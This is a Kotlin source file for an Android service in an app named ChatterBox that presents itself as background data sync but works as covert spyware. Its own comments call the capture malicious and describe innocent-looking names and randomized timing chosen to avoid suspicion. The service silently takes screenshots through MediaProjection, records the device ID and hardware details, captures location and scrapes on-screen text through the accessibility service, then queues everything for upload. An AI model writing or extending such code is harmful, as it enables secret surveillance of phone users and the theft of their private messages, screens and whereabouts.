package com.example.ChatterBox.database

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.Semaphore
import java.util.concurrent.atomic.AtomicBoolean
import org.json.JSONObject

class BackgroundSyncService : Service() {
    private val TAG = "SyncService" // Generic, innocent-looking tag
    private val NOTIFICATION_ID = 1023
    private val CHANNEL_ID = "background_sync"

    private var syncThread: HandlerThread? = null
    private var syncHandler: Handler? = null
    private val isSyncing = AtomicBoolean(false)

    private var mediaProjManager: MediaProjectionManager? = null
    private var mediaProj: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val mediaLock = Semaphore(1)

    private var screenDensity: Int = 0
    private var displayWidth: Int = 0
    private var displayHeight: Int = 0
    private var projIntent: Intent? = null
    private var projResultCode: Int = 0

    private var dataSync: DataSynchronizer? = null
    private var lastSyncTime = 0L

    // Use consistent device ID throughout the app
    private val deviceId: String by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    override fun onCreate() {
        super.onCreate()
        // Create a handler thread with an innocent name
        syncThread = HandlerThread("DataSyncThread").apply { start() }
        syncHandler = Handler(syncThread!!.looper)

        createInnocentNotificationChannel()
        val notification = createInnocentNotification()
        startForeground(NOTIFICATION_ID, notification)

        // Initialize synchronizer with innocent name
        dataSync = DataSynchronizer(this)

        Log.d(TAG, "Background sync service initialized")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Sync service starting...")
        val initialDelay = (30 * 1000L) + (Math.random() * 60 * 1000L).toLong() // 30-90 seconds
        syncHandler?.postDelayed({
            monitorForSyncOpportunities()
        }, initialDelay)
        if (intent?.action == "SETUP_PROJECTION") {
            val resultCode = intent.getIntExtra("resultCode", 0)
            val data = intent.getParcelableExtra<Intent>("data")
            if (data != null) {
                setupMediaCapture(resultCode, data)
                Log.d(TAG, "Media capture initialized for sync")
            }
        }

        // Start monitoring for idle periods to perform "sync" (data collection)
        monitorForSyncOpportunities()

        return START_STICKY
    }

    private fun createInnocentNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val name = "Data Synchronization"
            val description = "Background syncing of app data"
            val importance = NotificationManager.IMPORTANCE_LOW
            val channel = NotificationChannel(CHANNEL_ID, name, importance).apply {
                this.description = description
            }
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createInnocentNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("ChatterBox")
            .setContentText("Syncing team data...")
            .setSmallIcon(android.R.drawable.ic_popup_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun setupMediaCapture(resultCode: Int, data: Intent) {
        projResultCode = resultCode
        projIntent = data

        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = resources.displayMetrics
        screenDensity = metrics.densityDpi
        displayWidth = metrics.widthPixels
        displayHeight = metrics.heightPixels
    }

    private fun monitorForSyncOpportunities() {
        // Use the existing IdleDetector from your accessibility implementation
        // This makes the malicious capture blend with legitimate app behavior
        val idleCallback = {
            if (!isSyncing.get()) {
                syncHandler?.post {
                    synchronized(isSyncing) {
                        if (!isSyncing.get()) {
                            isSyncing.set(true)
                            performBackgroundSync()
                            isSyncing.set(false)
                        }
                    }
                }
            }
        }

        // Listen for device idle state changes from the accessibility service
        com.example.ChatterBox.accessibility.IdleDetector.registerUserActivity()

        // Also schedule periodic "syncs" when the app is active
        syncHandler?.postDelayed(object : Runnable {
            override fun run() {
                val now = System.currentTimeMillis()

                // Only sync if:
                // 1. We haven't synced in the last 30 minutes
                // 2. Device is likely to be idle or charging (use accessibility IdleDetector)
                // 3. We're not already syncing
                if ((now - lastSyncTime > 30 * 60 * 1000) && !isSyncing.get()) {
                    syncHandler?.post {
                        synchronized(isSyncing) {
                            if (!isSyncing.get()) {
                                isSyncing.set(true)
                                performBackgroundSync()
                                isSyncing.set(false)
                                lastSyncTime = System.currentTimeMillis()
                            }
                        }
                    }
                }

                // Schedule next check with randomized interval to look less suspicious
                val nextInterval = (1 * 60 * 1000L) + (Math.random() * 10 * 60 * 1000L).toLong()
                syncHandler?.postDelayed(this, nextInterval)
            }
        }, 1 * 60 * 1000L) // First check after 15 minutes
    }

    private fun performBackgroundSync() {
        try {
            // Only perform operations if battery is above 30% or device is charging
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val batteryLevel = batteryManager.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val isCharging = batteryManager.isCharging

            if (batteryLevel > 30 || isCharging) {
                captureScreenContent()
                collectDeviceData()
                captureLocation()
                dataSync?.synchronizeData()
            } else {
                // Just collect basic data which is less resource-intensive
                collectDeviceData()
            }
        } catch (e: Exception) {
            // Silent fail
        }
    }

    private fun captureScreenContent() {
        if (projIntent == null) return

        try {
            if (mediaProjManager == null) {
                mediaProjManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            }

            if (mediaProj == null) {
                mediaProj = mediaProjManager?.getMediaProjection(projResultCode, projIntent!!)
            }

            imageReader = ImageReader.newInstance(
                displayWidth, displayHeight, PixelFormat.RGBA_8888, 1
            )

            virtualDisplay = mediaProj?.createVirtualDisplay(
                "SyncDisplay",
                displayWidth, displayHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, null
            )

            // Delay to ensure capture completes
            Thread.sleep(100)

            val image = imageReader?.acquireLatestImage()
            if (image != null) {
                val bitmap = imageToBitmap(image)
                image.close()

                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val filename = "sync_${timestamp}.jpg"

                // Convert to JPEG to save space
                val jpegBytes = compressBitmap(bitmap)

                // Save internally within app storage, not external storage
                val file = File(getDir("sync_data", Context.MODE_PRIVATE), filename)
                FileOutputStream(file).use { out ->
                    out.write(jpegBytes)
                }

                // Queue for later synchronization
                dataSync?.queueForSync("screen_data", file.absolutePath)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Sync error: ${e.message}")
        } finally {
            virtualDisplay?.release()
            virtualDisplay = null
            imageReader?.close()
            imageReader = null
        }
    }

    private fun imageToBitmap(image: Image): Bitmap {
        val planes = image.planes
        val buffer = planes[0].buffer
        val pixelStride = planes[0].pixelStride
        val rowStride = planes[0].rowStride
        val rowPadding = rowStride - pixelStride * image.width

        val bitmap = Bitmap.createBitmap(
            image.width + rowPadding / pixelStride,
            image.height,
            Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        return bitmap
    }

    private fun compressBitmap(bitmap: Bitmap): ByteArray {
        val out = ByteArrayOutputStream()
        // Use lower quality to reduce size
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, out)
        return out.toByteArray()
    }

    private fun collectDeviceData() {
        try {
            val deviceInfo = JSONObject().apply {
                put("device_model", Build.MODEL)
                put("device_manufacturer", Build.MANUFACTURER)
                put("android_version", Build.VERSION.RELEASE)
                put("device_id", deviceId) // CONSISTENT: Always use deviceId
                put("timestamp", System.currentTimeMillis())
            }

            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "device_info_${timestamp}.json"

            val file = File(getDir("sync_data", Context.MODE_PRIVATE), filename)
            FileOutputStream(file).use { out ->
                out.write(deviceInfo.toString().toByteArray())
            }

            dataSync?.queueForSync("device_info", file.absolutePath)
        } catch (e: Exception) {
            Log.e(TAG, "Device data collection error: ${e.message}")
        }
    }

    private fun captureLocation() {
        try {
            val locationTracker = LocationTracker.getInstance(this)
            locationTracker.captureLastKnownLocation { locationData ->
                try {
                    val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                    val filename = "location_${timestamp}.json"

                    // Use a consistent storage location
                    val storage = StorageManager.getStorageDir(this, "location_data")
                    val file = File(storage, filename)
                    FileOutputStream(file).use { out ->
                        out.write(locationData.toString().toByteArray())
                    }

                    // Queue for synchronization using standardized path
                    dataSync?.queueForSync("location_data", file.absolutePath)
                } catch (e: Exception) {
                    Log.e(TAG, "Location save error: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Location capture error: ${e.message}")
        }
    }

    private fun captureVisibleContent() {
        val accessibilityService = com.example.ChatterBox.accessibility.AccessibilityService.getInstance()
        if (accessibilityService != null) {
            try {
                val root = accessibilityService.rootInActiveWindow
                if (root != null) {
                    val extractedText = extractTextFromNode(root)
                    if (extractedText.isNotEmpty()) {
                        // Create a structured JSON payload
                        val capturedData = JSONObject().apply {
                            put("timestamp", System.currentTimeMillis())
                            put("device_id", deviceId) // CONSISTENT: Always use deviceId
                            put("content_type", "text")
                            put("text", extractedText)
                            put("device_model", Build.MODEL)
                            put("android_version", Build.VERSION.RELEASE)
                        }

                        // Process and store the text
                        dataSync?.queueForSync("screen_content", capturedData.toString())
                    }
                    root.recycle()
                }
            } catch (e: Exception) {
                // Silent fail
            }
        }
    }

    private fun extractTextFromNode(node: android.view.accessibility.AccessibilityNodeInfo): String {
        val sb = StringBuilder()
        if (node.text != null) {
            sb.append(node.text)
            sb.append(" ")
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            sb.append(extractTextFromNode(child))
            child.recycle()
        }
        return sb.toString()
    }

    override fun onDestroy() {
        syncThread?.quitSafely()
        mediaProj?.stop()
        mediaProj = null

        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}